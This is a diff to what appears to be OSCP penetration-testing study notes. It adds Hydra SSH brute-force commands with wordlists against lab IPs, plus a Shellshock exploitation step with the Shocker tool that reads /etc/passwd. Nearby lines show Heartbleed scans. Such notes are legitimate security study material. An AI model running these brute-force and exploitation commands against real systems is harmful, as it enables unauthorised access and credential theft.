@@ -253,6 +253,17 @@ ssh root@10.11.1.71
 ECDSA key fingerprint is SHA256...
 ```
 
+* Hydra
+```
+hydra -L validusers.txt -e nsr ssh://IP
+
+hydra -L validusers.txt -P wordlist.txt 10.10.10.10 ssh
+
+hydra -L validusers.txt -P cewl.txt 10.10.10.10 ssh
+
+hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ssh
+```
+
 * OSCP recommended SSH brute force tools
 	* A custom wordlist for the target (using another vulnerability or CeWL/wordhound)
 	* Hydra (don't forget about "-e [VALUES]")
@@ -390,7 +401,6 @@ Ftp-server but it uses UDP
 * nmap --script=ssl-heartbleed -p 443
 * msf > use auxiliary/scanner/ssl/openssl_heartbleed msf auxiliary(openssl_heartbleed) > show options
 
-
 #### nmap 
 ```heartbleed
 nmap -sV --script=ssl-heartbleed 192.168.101.8
@@ -400,6 +410,18 @@ nmap -sV --script=ssl-heartbleed 192.168.101.8
 ```
 use auxiliary/scanner/ssl/openssl_heartbleed
 ```
+
+### Shellshock 
+* [Shocker](https://github.com/nccgroup/shocker)
+```
+python shocker.py -H 10.11.1.# --cgi /cgi-bin/admin.cgi 
+
+//if working
+/bin/cat /etc/passwd
+
+//sometimes quitting and rerunning the command works
+```
+
 [Back](#summary)
 
 ## Port 88 - Kerberos
